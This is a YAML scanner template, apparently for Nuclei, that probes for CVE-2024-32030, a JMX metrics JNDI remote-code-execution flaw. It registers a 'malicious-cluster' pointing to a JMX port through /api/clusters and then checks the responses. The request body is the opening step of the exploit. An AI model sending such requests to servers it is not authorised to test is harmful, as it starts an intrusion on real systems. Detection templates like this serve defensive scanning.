id: CVE-2024-32030
info:
  author: "H\xFCseyin TINTA\u015E"
  description: 'CVE-2024-32030 JMX Metrics Collection JNDI Resolution Remote Code
    Execution Vulnerability. This template checks for the presence of the vulnerability
    by attempting to connect to a malicious JMX server.

    '
  name: CVE-2024-32030 JMX Metrics Collection JNDI RCE
  severity: critical
  tags: cve,cve2024,jmx,rce,cve2024-32030
requests:
- body: "{\n  \"name\": \"malicious-cluster\",\n  \"bootstrapServers\": [\"127.0.0.1:1718\"\
    ],\n  \"metrics\": {\n    \"type\": \"JMX\",\n    \"port\": 1718\n  }\n}\n"
  headers:
    Content-Type: application/json
  matchers:
  - part: body
    type: word
    words:
    - malicious-cluster added successfully
  method: POST
  path:
  - '{{BaseURL}}/api/clusters'
- matchers:
  - part: body
    type: word
    words:
    - malicious-cluster
  method: GET
  path:
  - '{{BaseURL}}/api/clusters/malicious-cluster'
- matchers:
  - part: body
    type: word
    words:
    - metrics
  method: GET
  path:
  - '{{BaseURL}}/api/clusters/malicious-cluster/metrics'
